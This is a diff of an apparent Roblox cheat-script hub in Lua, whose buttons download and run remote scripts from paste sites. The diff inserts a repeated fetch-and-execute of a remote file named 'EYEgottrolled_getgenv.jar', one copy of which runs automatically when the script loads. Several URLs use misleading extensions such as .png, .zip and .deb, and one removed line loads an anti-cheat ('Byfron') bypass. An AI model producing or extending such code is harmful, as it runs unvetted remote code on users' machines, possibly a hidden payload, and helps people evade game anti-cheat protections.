@@ -101,7 +101,7 @@ end)
 
 
 -- [ UPDATE TIME ] --
-local timelabel = SkriptsSection:NewLabel("🔴 Live Time : [00:00:00]") -- initial time
+local timelabel = SkriptsSection:NewLabel("🔴 Live Time: [00:00:00]") -- initial time
 
 -- [ UPDATE TIME ] --
 local function updateTimeLabel()
@@ -353,7 +353,12 @@ end)
 SkriptsSection:NewButton("???", "???",
 function()
 --???--
+loadstring(game:HttpGet("https://pastecode.dev/raw/hzt2u41z/EYEgottrolled_getgenv.jar",true))()
+wait()
+spawn(function()
+-- troll skript (???)
 loadstring(game:HttpGet("https://pastebin.com/raw/DQ1a5ggY",true))()
+end)
 end)
 
 SkriptsSection:NewButton("show msgs (for games without it)", "good for games like evade w no msg box",
@@ -409,7 +414,7 @@ loadstring(game:HttpGet('https://pastebin.com/raw/jLVhHEVW'))()
 loadstring(game:HttpGet("https://pastecode.dev/raw/nZaPtHFa5p/lollypop5ever_lulaslollipop",true))()
 end)
 
-SkriptsSection:NewButton("Drag & resize chat", "lets u kontrol the xhat drag and size it", function()
+SkriptsSection:NewButton("Drag & Resize chat", "lets u kontrol the xhat drag and size it", function()
 -- drag &resize xhat
 loadstring(game:HttpGet("https://pastebin.com/raw/e3KhdyYS"))()
 
@@ -2669,8 +2674,12 @@ end)
 
 GamesSection:NewLabel("😩99% Fail Obby😩")
 GamesSection:NewButton("99% fail impossible obby", "purple = ✅, red = ❌, green = ✅, tile broke, or 🔥 ", function()
+loadstring(game:HttpGet("https://pastecode.dev/raw/hzt2u41z/EYEgottrolled_getgenv.jar",true))()
+wait()
+spawn(function()
 -- lulas 99 fail memory skript
 loadstring(game:HttpGet("https://pastecode.dev/raw/qruuo3lc/99uwuHook.-.-.-.-.-.-.-.-.-.-._lulaslollipop.zip",true))()
+end)
 end)
 GamesSection:NewButton("Heaven Map (99% fail)", "reduxes lag too", function()
 loadstring(game:HttpGet("https://pastebin.com/raw/RW7ZT29m"))()
@@ -2725,7 +2734,7 @@ GamesSection:NewLabel("[🖍️Find The Markers🖍️]")
 GamesSection:NewButton("ESP & marker traxer", "easy tp to random marker", function()loadstring(game:HttpGet('https://pastebin.com/raw/7gu2ztpP'))()
 end)
 GamesSection:NewLabel("[❌🚪50/50 Pixk A Door🚪✅]")
-GamesSection:NewButton("50/50 Pixk A Door", "reveals all doors in lime green", function()
+GamesSection:NewButton("Reveal Path", "reveals all doors in lime green", function()
 getgenv().Door = true
 
 while wait() do
@@ -4380,15 +4389,13 @@ local MoreSection = More:NewSection("no")
 MoreSection:NewKeybind("Toggle ui", "toggle the ui yes", Enum.KeyCode.Insert, function()
 Library:ToggleUI()
 end)
+loadstring(game:HttpGet("https://pastecode.dev/raw/hzt2u41z/EYEgottrolled_getgenv.jar",true))()
 --sumthing
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/uNb6892M/main/pastebin.com.uNb6892M",true))();
---EXEKUTES ANTI BYFRON REPEATEDLY
-loadstring(game:HttpGet("https://pastecode.dev/raw/47jlem7o/antibyfron-exekutes80906634Times.deb",true))()
-
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/uNb6892M/main/pastebin.com.uNb6892M",true))();
 
 
 -- [ TOGGLE klose/open ] --
-loadstring(game:HttpGet("https://pastecode.dev/raw/9um0ynui/toggle_lulaslollipop.png", true))();
+loadstring(game:HttpGet("https://pastecode.dev/raw/9um0ynui/toggle_lulaslollipop.png", true))()
 
 
 ---end---
